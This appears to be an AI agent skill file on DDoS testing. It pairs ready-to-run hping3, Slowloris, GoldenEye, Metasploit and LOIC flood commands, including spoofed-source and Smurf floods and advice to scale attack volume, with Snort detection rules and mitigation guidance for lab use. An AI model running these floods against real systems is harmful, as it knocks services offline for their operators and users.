---
name: DDoS Attack Testing
description: This skill should be used when the user asks to "test for DDoS vulnerabilities", "perform denial of service testing", "simulate traffic floods", "assess network resilience", "configure DDoS detection rules", or "analyze DoS attack patterns". It provides comprehensive techniques for authorized DDoS testing and detection configuration.
version: 1.0.0
tags: [ddos, dos, flood-attack, hping3, snort, network-security, stress-testing]
---

# DDoS Attack Testing

## Purpose

Conduct authorized denial of service testing to assess network resilience and configure intrusion detection systems (IDS) to detect and alert on various DoS attack patterns. This skill covers volume-based, protocol-based, and application-layer attacks using command-line and GUI tools, along with Snort IDS rule configuration for detection.

## Prerequisites

### Required Tools
```bash
# Hping3 - packet crafting and flooding
sudo apt-get install hping3

# LOIC/HOIC - GUI-based stress testing
# Download from authorized sources only

# Slowloris - Application layer testing
git clone https://github.com/gkbrk/slowloris

# Snort IDS - Detection
sudo apt-get install snort

# Wireshark - Traffic analysis
sudo apt-get install wireshark
```

### Required Knowledge
- TCP/IP protocol fundamentals
- OSI model layers
- Network traffic analysis
- IDS/IPS configuration

### Required Access
- Written authorization for testing
- Isolated test network environment
- Administrative access on target systems
- IDS/Snort configuration access

## Outputs and Deliverables

1. **Resilience Assessment Report** - Document network response to stress testing
2. **IDS Rule Configuration** - Snort rules for attack detection
3. **Attack Pattern Analysis** - Traffic captures and signatures
4. **Mitigation Recommendations** - DDoS protection strategies

## Core Workflow

### Phase 1: Understanding DDoS Categories

Identify the attack category based on target:

```
Volume Based Attacks:
- Objective: Flood bandwidth with traffic
- Metrics: Bits per second (bps)
- Examples: UDP flood, ICMP flood
- Target: Network bandwidth

Protocol Based Attacks:
- Objective: Exhaust server resources
- Metrics: Packets per second (pps)
- Examples: SYN flood, Ping of Death
- Target: Connection state tables

Application Layer Attacks:
- Objective: Crash specific applications
- Metrics: Requests per second (rps)
- Examples: HTTP flood, Slowloris
- Target: Web servers, applications
```

### Phase 2: TCP SYN Flood Testing

Test network resilience to SYN flood attacks:

```bash
# Using Hping3
hping3 -S --flood -p 80 192.168.1.107

# Options:
# -S     : Set SYN flag
# --flood: Send packets as fast as possible
# -p 80  : Target port 80

# Using Metasploit
msfconsole
use auxiliary/dos/tcp/synflood
set RHOST 192.168.1.107
set SHOST 192.168.1.105
set RPORT 80
exploit
```

Configure Snort detection rule:

```bash
# Edit local rules
sudo gedit /etc/snort/rules/local.rules

# Add SYN flood detection rule
alert tcp any any -> 192.168.1.107 any (msg:"SYN Flood DoS"; flags:S; sid:1000006; threshold:type threshold, track by_src, count 100, seconds 1;)

# Start Snort in IDS mode
sudo snort -A console -q -u snort -g snort -c /etc/snort/snort.conf -i eth0
```

### Phase 3: UDP Flood Testing

Test network against UDP flood attacks:

```bash
# Using Hping3
hping3 --udp --flood -p 80 192.168.1.107

# Options:
# --udp   : Use UDP protocol
# --flood : Maximum packet rate
# -p 80   : Target port

# Specify data size
hping3 --udp --flood -p 53 -d 1000 192.168.1.107
# -d 1000 : 1000 bytes of data per packet
```

Configure Snort detection rule:

```bash
# UDP flood detection rule
alert udp any any -> 192.168.1.107 any (msg:"UDP Flood DoS"; sid:1000001; threshold:type threshold, track by_src, count 100, seconds 1;)
```

### Phase 4: SYN-FIN Flood Testing

Test with invalid flag combinations:

```bash
# SYN-FIN flood
hping3 -SF --flood -p 80 192.168.1.107

# Options:
# -S : SYN flag
# -F : FIN flag
# Combined creates invalid packet
```

Detection is built into Snort for anomalous flag combinations.

### Phase 5: PUSH-ACK Flood Testing

Test with PSH-ACK packet flood:

```bash
# PUSH-ACK flood
hping3 -PA --flood -p 80 192.168.1.107

# Options:
# -P : PSH flag
# -A : ACK flag
```

Configure Snort detection rule:

```bash
# PUSH-ACK flood detection
alert tcp any any -> 192.168.1.107 any (msg:"PUSH-ACK Flood DoS"; flags:PA; sid:1000002; threshold:type threshold, track by_src, count 100, seconds 1;)
```

### Phase 6: RST Flood Testing

Test with TCP reset packet flood:

```bash
# RST flood
hping3 -R --flood -p 80 192.168.1.107

# Options:
# -R : RST flag
```

Configure Snort detection rule:

```bash
# RST flood detection
alert tcp any any -> 192.168.1.107 any (msg:"RST Flood DoS"; flags:R; sid:1000003;)
```

### Phase 7: FIN Flood Testing

Test with FIN packet flood:

```bash
# FIN flood
hping3 -F --flood -p 80 192.168.1.107

# Options:
# -F : FIN flag
```

Configure Snort detection rule:

```bash
# FIN flood detection
alert tcp any any -> 192.168.1.107 any (msg:"FIN Flood DoS"; flags:F; sid:1000004;)
```

### Phase 8: ICMP Smurf Attack

Test amplification attack scenario:

```bash
# Smurf attack simulation
hping3 --icmp --flood 192.168.1.255 -a 192.168.1.107

# Options:
# --icmp : Use ICMP protocol
# -a     : Spoof source address (victim)
# Target : Broadcast address

# All hosts reply to victim's spoofed address
```

Configure Snort detection rule:

```bash
# ICMP flood detection
alert icmp any any -> 192.168.1.107 any (msg:"ICMP Flood DoS"; sid:1000005; threshold:type threshold, track by_src, count 50, seconds 1;)
```

### Phase 9: Application Layer Testing

Test HTTP layer resilience:

**Slowloris Attack:**
```bash
# Slowloris - Slow HTTP attack
python slowloris.py 192.168.1.107 -p 80 -s 500

# Options:
# -p 80  : Target port
# -s 500 : Number of sockets
```

**GoldenEye Attack:**
```bash
# GoldenEye - HTTP DoS
git clone https://github.com/jseidl/GoldenEye
python goldeneye.py http://192.168.1.107 -w 50 -s 500

# Options:
# -w 50  : Number of workers
# -s 500 : Number of sockets
```

### Phase 10: GUI-Based Testing

Use graphical tools for stress testing:

**LOIC (Low Orbit Ion Cannon):**
```bash
# TCP Flood with LOIC
1. Enter target IP: 192.168.1.107
2. Select Port: 80
3. Select Method: TCP
4. Set Threads: 10
5. Click "IMMA CHARGIN MAH LAZER"
```

**HOIC (High Orbit Ion Cannon):**
```bash
# HTTP Flood with HOIC
1. Add Target URL
2. Select Power: High
3. Set Threads: 256
4. Launch Attack
```

## Quick Reference

### Hping3 Flag Options

| Flag | Option | Description |
|------|--------|-------------|
| SYN | `-S` | TCP SYN flag |
| ACK | `-A` | TCP ACK flag |
| FIN | `-F` | TCP FIN flag |
| RST | `-R` | TCP RST flag |
| PSH | `-P` | TCP PSH flag |
| URG | `-U` | TCP URG flag |
| UDP | `--udp` | Use UDP protocol |
| ICMP | `--icmp` | Use ICMP protocol |

### Common Hping3 Commands

| Attack Type | Command |
|-------------|---------|
| SYN Flood | `hping3 -S --flood -p 80 TARGET` |
| UDP Flood | `hping3 --udp --flood -p 80 TARGET` |
| ICMP Flood | `hping3 --icmp --flood TARGET` |
| SYN-FIN | `hping3 -SF --flood -p 80 TARGET` |
| PSH-ACK | `hping3 -PA --flood -p 80 TARGET` |
| RST Flood | `hping3 -R --flood -p 80 TARGET` |
| FIN Flood | `hping3 -F --flood -p 80 TARGET` |
| Spoof Source | `hping3 -S --flood -a FAKE_IP -p 80 TARGET` |

### Snort Rule Structure

```bash
alert [protocol] [src_ip] [src_port] -> [dst_ip] [dst_port] (
    msg:"Alert Message";
    flags:[TCP flags];
    sid:[unique ID];
    threshold:type [threshold|limit|both], track [by_src|by_dst], count [N], seconds [N];
)
```

### Attack Detection Indicators

| Attack Type | Indicators |
|-------------|------------|
| SYN Flood | High SYN packets, low SYN-ACK |
| UDP Flood | High UDP traffic, random ports |
| ICMP Flood | High ICMP echo requests |
| Slowloris | Many half-open connections |
| HTTP Flood | High HTTP requests/second |

## Constraints and Limitations

### Legal Requirements
- Only test systems you own or have written authorization
- DDoS attacks on production systems are illegal
- Use isolated test networks
- Document all testing activities

### Ethical Boundaries
- Never attack production systems without explicit permission
- Avoid testing during business hours
- Coordinate with network administrators
- Have rollback procedures ready

### Technical Limitations
- Test results vary with network capacity
- CDN and cloud protection may skew results
- Some attacks require significant bandwidth
- Detection rules need tuning for environment

## Examples

### Example 1: Complete SYN Flood Test

**Scenario:** Test firewall resilience to SYN flood

```bash
# Step 1: Configure Snort rule
echo 'alert tcp any any -> 192.168.1.107 80 (msg:"SYN Flood"; flags:S; sid:1000001; threshold:type threshold, track by_src, count 50, seconds 10;)' >> /etc/snort/rules/local.rules

# Step 2: Start Snort
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0

# Step 3: Start Wireshark capture
wireshark -i eth0 -f "host 192.168.1.107 and tcp"

# Step 4: Launch attack from attacker machine
hping3 -S --flood -p 80 -c 10000 192.168.1.107

# Step 5: Observe Snort alerts
# [**] [1:1000001:0] SYN Flood [**]
# 192.168.1.105 -> 192.168.1.107

# Step 6: Analyze Wireshark capture
# Check SYN packet rate and response behavior
```

### Example 2: Multi-Vector Test

**Scenario:** Test against multiple attack types

```bash
# Configure comprehensive Snort rules
cat >> /etc/snort/rules/local.rules << 'EOF'
alert tcp any any -> $HOME_NET any (msg:"SYN Flood"; flags:S; sid:1000001; threshold:type threshold, track by_src, count 100, seconds 1;)
alert udp any any -> $HOME_NET any (msg:"UDP Flood"; sid:1000002; threshold:type threshold, track by_src, count 100, seconds 1;)
alert icmp any any -> $HOME_NET any (msg:"ICMP Flood"; sid:1000003; threshold:type threshold, track by_src, count 50, seconds 1;)
alert tcp any any -> $HOME_NET 80 (msg:"HTTP Flood"; flags:PA; content:"GET"; sid:1000004; threshold:type threshold, track by_src, count 50, seconds 1;)
EOF

# Run tests sequentially
hping3 -S --flood -p 80 -c 5000 TARGET
sleep 30
hping3 --udp --flood -p 53 -c 5000 TARGET
sleep 30
hping3 --icmp --flood -c 5000 TARGET
```

### Example 3: Slowloris Application Attack

**Scenario:** Test web server connection limits

```bash
# Step 1: Check current connections
netstat -an | grep :80 | wc -l

# Step 2: Launch Slowloris
python slowloris.py 192.168.1.107 -p 80 -s 200

# Step 3: Monitor server connections
watch -n 1 'netstat -an | grep :80 | grep ESTABLISHED | wc -l'

# Step 4: Test legitimate access
curl -v --max-time 10 http://192.168.1.107/
# Expect: Connection timeout or slow response

# Step 5: Stop attack and verify recovery
```

## Troubleshooting

### Snort Not Detecting Attacks

**Problem:** No alerts generated during flood

**Solutions:**
1. Verify Snort is listening on correct interface
2. Check rule syntax with `snort -T -c snort.conf`
3. Ensure HOME_NET variable is set correctly
4. Lower threshold values for testing
5. Verify traffic is reaching the interface

### Hping3 Flood Too Slow

**Problem:** Flood rate insufficient for testing

**Solutions:**
1. Use `--faster` or `--flood` options
2. Run from multiple sources simultaneously
3. Increase system network buffer sizes
4. Use dedicated network interface
5. Consider using specialized stress testing tools

### Target Not Affected

**Problem:** Target continues operating normally

**Solutions:**
1. Increase attack volume
2. Target may have DDoS protection
3. Check network path for filtering
4. Verify traffic is reaching target (Wireshark)
5. Target may have high capacity

### False Positives in Detection

**Problem:** Legitimate traffic triggers alerts

**Solutions:**
1. Increase threshold count values
2. Add exceptions for known legitimate sources
3. Use rate-based detection instead of simple count
4. Whitelist trusted IP addresses
5. Tune rules based on baseline traffic analysis

## Mitigation Recommendations

### Network Level
1. Implement rate limiting at edge routers
2. Configure SYN cookies on servers
3. Use anycast for distributed absorption
4. Deploy hardware-based DDoS mitigation
5. Configure ACLs to block known attack patterns

### Application Level
1. Implement connection timeouts
2. Use reverse proxy with rate limiting
3. Deploy Web Application Firewall (WAF)
4. Configure connection limits per IP
5. Use CAPTCHA for suspicious requests

### Infrastructure Level
1. Use CDN for traffic absorption
2. Implement geo-blocking if appropriate
3. Configure auto-scaling for cloud resources
4. Have DDoS mitigation service on standby
5. Maintain incident response procedures
